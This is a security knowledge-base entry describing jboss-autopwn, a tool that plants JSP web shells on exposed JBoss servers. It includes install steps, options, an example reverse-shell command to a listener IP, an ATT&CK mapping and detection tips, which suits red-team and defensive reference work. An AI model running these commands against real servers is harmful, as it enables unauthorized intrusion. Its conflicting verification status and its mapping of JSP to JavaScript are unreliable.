---
id: 073b1c9a-a8eb-4497-b55d-40286e08da01
type: tool
verified: true
created_at: '2019-08-28T21:17:38.163599+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - exploitation
  - jboss
  - web-shell
  - reverse-shell
url: 'https://github.com/c0ny1/jboss-autopwn'
validated: true
---

# jboss-autopwn

**Status**: Unverified

## Overview

jboss-autopwn is a Python-based exploitation tool designed to automatically discover and exploit vulnerable JBoss Application Server (AS) instances. It deploys a JSP web shell to enable command execution and provides options for bind shells, reverse shells, Meterpreter integration (on Windows), and VNC access. Commonly used in penetration testing for targeting misconfigured or outdated JBoss deployments on public-facing web applications.

## Description

The tool scans for common JBoss administrative interfaces such as /jmx-console, /web-console, and /jbossws-services, which are often left exposed. Upon identification, it deploys a malicious JSP shell that allows remote code execution. Features include multi-platform support for targets (Windows, Linux, Mac), flexible shell types (bind or reverse), and advanced payloads like Meterpreter for Windows environments. It automates the exploitation process, making it efficient for red team operations against Java-based web servers.

## Features

- Feature 1: Automatic discovery of vulnerable JBoss paths and interfaces
- Feature 2: Deployment of JSP shells for interactive command execution
- Feature 3: Support for bind and reverse shells across multiple OS targets
- Feature 4: Integration with Metasploit payloads (e.g., Meterpreter, VNC) for Windows
- Feature 5: Customizable payloads and evasion options

## Installation

### Requirements

- Python 2.7 or 3.x
- Git
- Optional: Metasploit Framework for advanced payloads

### Install Commands

```bash
# Clone the repository
git clone https://github.com/c0ny1/jboss-autopwn.git
cd jboss-autopwn

# Make executable (if needed)
chmod +x jboss-autopwn.py

# For Kali Linux/Ubuntu (Python dependencies if any)
sudo apt update && sudo apt install python3 python3-pip git
```

For Windows: Use Git Bash or WSL, or download the script directly.

## Basic Usage

```bash
python jboss-autopwn.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -u, --url | Target JBoss URL (required) |
| -r, --reverse | Reverse shell to IP:PORT |
| -b, --bind | Bind shell on target port |
| -p, --port | Target port (default 8080) |
| --platform | Specify target platform (linux/windows/mac) |
| -h, --help | Show help message |

## Examples

### Example 1: Basic Usage

```bash
python jboss-autopwn.py -u http://target.com:8080
```

This performs discovery and deploys a basic JSP shell.

### Example 2: Advanced Usage

```bash
python jboss-autopwn.py -u http://target.com:8080 -r 192.168.1.100:4444 --platform windows
```

Deploys a reverse Meterpreter shell to the specified listener.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Server Software Component]] Server Software Component
- [[JavaScript]] JavaScript (for JSP execution)

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Lateral Movement]] Lateral Movement

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Unauthorized JSP files (e.g., shell.jsp) in JBoss deployments
- Detection method 2: Unusual outbound connections from JBoss servers to attacker IPs
- Detection method 3: Logs showing access to admin interfaces (/jmx-console, /web-console)
- Detection method 4: File integrity monitoring on JBoss webapps directory
- Detection method 5: Network IDS rules for JSP shell payloads or reverse shell traffic

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[Metasploit]]
- [[Burp-Suite]]

## References

- Official GitHub: https://github.com/c0ny1/jboss-autopwn
- JBoss Security Documentation: https://access.redhat.com/documentation/en-us/red_hat_jboss_enterprise_application_platform
